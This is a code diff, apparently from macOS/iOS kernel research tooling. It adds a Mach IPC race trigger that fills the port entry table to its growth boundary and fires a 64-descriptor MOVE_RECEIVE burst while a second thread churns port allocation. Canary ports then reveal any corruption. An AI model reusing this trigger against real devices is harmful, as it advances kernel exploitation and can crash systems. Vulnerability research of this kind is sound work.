@@ -144,6 +144,75 @@ static kern_return_t ensure_send_right(mach_port_t port) {
     return result;
 }
 
+// Per ollie: a received MOVE_RECEIVE right installs a NEW name — a NEW
+// ipc_entry allocated inside the receive path. That is the window where
+// ipc_port_translate_receive can race ipc_entry_grow_table. COPY_SEND of a
+// right we already hold only bumps urefs and allocates nothing.
+- (NSDictionary *)sendReceiveMoveBurst:(uint32_t)count port:(mach_port_t)port {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    if (count > 64) count = 64;
+    mach_port_t aux[64];
+    for (uint32_t i = 0; i < count; i++) {
+        aux[i] = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &aux[i]);
+    }
+    size_t descSize = sizeof(mach_msg_port_descriptor_t);
+    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + count * descSize;
+    uint8_t *buf = calloc(1, total);
+    if (!buf) {
+        result[@"status"] = @"CALLOC_FAILED";
+        return result;
+    }
+    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
+    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    hdr->msgh_size = (mach_msg_size_t)total;
+    hdr->msgh_remote_port = port;
+    hdr->msgh_local_port = MACH_PORT_NULL;
+    hdr->msgh_id = 0x4b51;
+    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
+    body->msgh_descriptor_count = count;
+    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+    for (uint32_t i = 0; i < count; i++) {
+        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
+        pd->name = aux[i];
+        pd->disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
+        pd->type = MACH_MSG_PORT_DESCRIPTOR;
+    }
+    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
+                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                (mach_msg_size_t)total, 0,
+                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
+    result[@"send_kr"] = @(kr);
+    free(buf);
+    if (kr != KERN_SUCCESS) {
+        for (uint32_t i = 0; i < count; i++) {
+            if (aux[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), aux[i]);
+        }
+        return result;
+    }
+    size_t rcvTotal = total + 64;
+    uint8_t *rcv = calloc(1, rcvTotal);
+    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
+    rh->msgh_size = (mach_msg_size_t)rcvTotal;
+    rh->msgh_local_port = port;
+    kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
+                                 port, 250, MACH_PORT_NULL);
+    result[@"recv_kr"] = @(rkr);
+    if (rkr == KERN_SUCCESS && rh->msgh_size >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
+        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
+        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
+        size_t available = (rh->msgh_size - sizeof(mach_msg_header_t) - sizeof(mach_msg_body_t)) / descSize;
+        uint32_t toRelease = MIN((size_t)rb->msgh_descriptor_count, available);
+        uint8_t *recvBase = rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+        for (uint32_t i = 0; i < toRelease; i++) {
+            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(recvBase + i * descSize);
+            if (pd->name != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), pd->name);
+        }
+    }
+    free(rcv);
+    return result;
+}
+
 // Churn the ipc entry table around the changed growth/free path.
 // This creates lifecycle pressure only; it does not localize or prove a bug.
 - (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
@@ -196,7 +265,9 @@ static kern_return_t ensure_send_right(mach_port_t port) {
         }
         uint32_t beforeInUse = [before[@"table_inuse"] unsignedIntValue];
         uint32_t currentSize = [before[@"table_size"] unsignedIntValue];
-        uint32_t target = currentSize;
+        // Per ollie: fill to boundary-1 so the RECEIVE inserts cross the edge
+        // and ipc_entry_grow_table fires inside mach_msg_receive.
+        uint32_t target = (currentSize > 1) ? currentSize - 1 : currentSize;
         if (target <= beforeInUse) {
             [rounds addObject:@{@"round": @(round), @"target_inuse": @(target), @"before": before,
                                 @"status": @"TARGET_BELOW_BASELINE_OR_INFO_FAILED"}];
@@ -217,7 +288,9 @@ static kern_return_t ensure_send_right(mach_port_t port) {
         }
 
         NSDictionary *afterAllocation = [self portSpaceBasicSnapshot];
-        NSDictionary *message = [self sendReceiveCount:1 port:port sendRight:sendRight];
+        // MOVE_RECEIVE burst: each received right allocates a NEW ipc_entry in
+        // the receive path (COPY_SEND would only bump urefs — ollie).
+        NSDictionary *message = [self sendReceiveMoveBurst:4 port:port];
         uint32_t destroyFailures = 0;
         for (NSNumber *name in allocated) {
             kern_return_t dkr = mach_port_destroy(mach_task_self(), (mach_port_t)name.unsignedIntValue);
@@ -572,6 +645,82 @@ static kern_return_t ensure_send_right(mach_port_t port) {
     for (int i = 0; i < PRECISE_N; i++) mach_port_destroy(mach_task_self(), pcanary[i]);
     mach_port_destroy(mach_task_self(), moveRx);
     mach_port_destroy(mach_task_self(), auxSend);
+
+    // --- boundary race: MOVE_RECEIVE burst vs ipc_entry_grow_table (ollie) ---
+    // Thread 1 receives a 64-descriptor MOVE_RECEIVE burst at table_size-1;
+    // Thread 2 spams mach_port_allocate/destroy so grow_table fires in the
+    // same window. Precise ie_bits oracle on 64 canaries catches a hit.
+    [report appendString:@"\n--- boundary race: MOVE_RECEIVE burst vs grow_table ---\n"];
+    NSDictionary *preRace = [self portSpaceBasicSnapshot];
+    uint32_t raceSize = [preRace[@"table_size"] unsignedIntValue];
+    uint32_t raceInUse = [preRace[@"table_inuse"] unsignedIntValue];
+    [report appendFormat:@"pre-race: size=%u inuse=%u\n", raceSize, raceInUse];
+
+    NSMutableArray *fillers = [NSMutableArray array];
+    uint32_t raceTarget = (raceSize > 1) ? raceSize - 1 : raceSize;
+    while (raceInUse + fillers.count < raceTarget && fillers.count < 4096) {
+        mach_port_t fp = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fp) != KERN_SUCCESS) break;
+        [fillers addObject:@(fp)];
+    }
+
+    #define RACE_CANARY_N 64
+    mach_port_t rcn[RACE_CANARY_N];
+    mach_port_type_t rct[RACE_CANARY_N];
+    mach_port_urefs_t rcr[RACE_CANARY_N];
+    for (int i = 0; i < RACE_CANARY_N; i++) {
+        rcn[i] = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcn[i]);
+        mach_port_insert_right(mach_task_self(), rcn[i], rcn[i], MACH_MSG_TYPE_MAKE_SEND);
+        mach_port_type(mach_task_self(), rcn[i], &rct[i]);
+        mach_port_get_refs(mach_task_self(), rcn[i], MACH_PORT_RIGHT_SEND, &rcr[i]);
+    }
+
+    __block volatile int churnRun = 1;
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        NSMutableArray *scratch = [NSMutableArray array];
+        while (churnRun) {
+            mach_port_t cp = MACH_PORT_NULL;
+            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &cp) == KERN_SUCCESS) {
+                [scratch addObject:@(cp)];
+                if (scratch.count > 256) {
+                    mach_port_t old = (mach_port_t)[scratch.firstObject unsignedIntValue];
+                    [scratch removeObjectAtIndex:0];
+                    mach_port_destroy(mach_task_self(), old);
+                }
+            }
+        }
+        for (NSNumber *np in scratch) mach_port_destroy(mach_task_self(), (mach_port_t)np.unsignedIntValue);
+    });
+
+    NSDictionary *raceBurst = [self sendReceiveMoveBurst:64 port:port];
+    churnRun = 0;
+    usleep(80000); // let the churn loop drain its scratch list
+    [report appendFormat:@"race burst: %@\n", raceBurst];
+    NSDictionary *postRace = [self portSpaceBasicSnapshot];
+    [report appendFormat:@"post-race: size=%u inuse=%u grew=%d\n",
+     [postRace[@"table_size"] unsignedIntValue], [postRace[@"table_inuse"] unsignedIntValue],
+     [postRace[@"table_size"] unsignedIntValue] > raceSize ? 1 : 0];
+
+    int raceMut = 0;
+    for (int i = 0; i < RACE_CANARY_N; i++) {
+        mach_port_type_t t2 = 0;
+        mach_port_urefs_t r2 = 0;
+        kern_return_t k1 = mach_port_type(mach_task_self(), rcn[i], &t2);
+        kern_return_t k2 = mach_port_get_refs(mach_task_self(), rcn[i], MACH_PORT_RIGHT_SEND, &r2);
+        if (k1 != KERN_SUCCESS || k2 != KERN_SUCCESS || t2 != rct[i] || r2 != rcr[i]) {
+            [report appendFormat:@"  RACE MUTATION canary[%d] port=0x%x (idx=%u): type 0x%x->0x%x srefs %u->%u\n",
+             i, rcn[i], rcn[i] >> 8, rct[i], t2, rcr[i], r2];
+            raceMut++;
+        }
+    }
+    [report appendFormat:@"race ie_bits mutations: %d/%d\n", raceMut, RACE_CANARY_N];
+    if (raceMut > 0) {
+        [report appendString:@"RACE_MUTATION_UNVERIFIED — independent table evidence required for attribution.\n"];
+    }
+    for (int i = 0; i < RACE_CANARY_N; i++) mach_port_destroy(mach_task_self(), rcn[i]);
+    for (NSNumber *np in fillers) mach_port_destroy(mach_task_self(), (mach_port_t)np.unsignedIntValue);
+
     // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
     // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
     [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
